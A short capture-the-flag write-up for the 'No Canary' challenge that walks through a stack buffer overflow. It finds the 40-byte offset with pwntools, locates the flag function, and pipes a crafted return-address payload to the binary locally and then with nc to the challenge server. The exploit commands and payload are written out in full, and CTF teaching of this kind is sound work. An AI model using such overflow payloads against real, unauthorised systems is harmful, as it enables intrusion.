# No Canary

Basic buffer overflow. Start by fuzzing the input:

```sh
# Generate unique sequence, specifying 8 bytes as the word size.
$ pwn cyclic -n 8 64
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa

# Run program in GDB with generated input and observe what value RBP gets
# clobbered with. Then, we look it up with pwn cyclic.
$ pwn cyclic -n 8 -l 0x6161616161616165
32

# RIP is stored after RBP on the stack, so we must write over the 8 bytes of
# the stored RBP. We know we have to write 32 bytes before we start clobbering
# RBP, so we have to write 32+8=40 bytes before we start clobbering RIP.
```

Now we get address of flag address so we can overwrite the RIP address stored on the stack:

```sh
$ nm -s ./no_canary | grep flag
0000000000401186 T flag
```

Knowing the offset to RIP and the address of where we want to return to, we can craft an exploit:

```sh
# Start by packing the return address into the proper endianness.
$ python2
>>> from pwn import *
>>> p64(0x0000000000401186)
'\x86\x11@\x00\x00\x00\x00\x00'

# Make our offset bytes.
$ python2 -c "print 'A'*40"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Fire the exploit locally.
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x11@\x00\x00\x00\x00\x00' | ./no_canary
```

Now we just fire at the remote:

```sh
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x11@\x00\x00\x00\x00\x00' | nc shell.actf.co 20700
... <snip> ...
actf{that_gosh_darn_canary_got_me_pwned!}
Segmentation fault
```
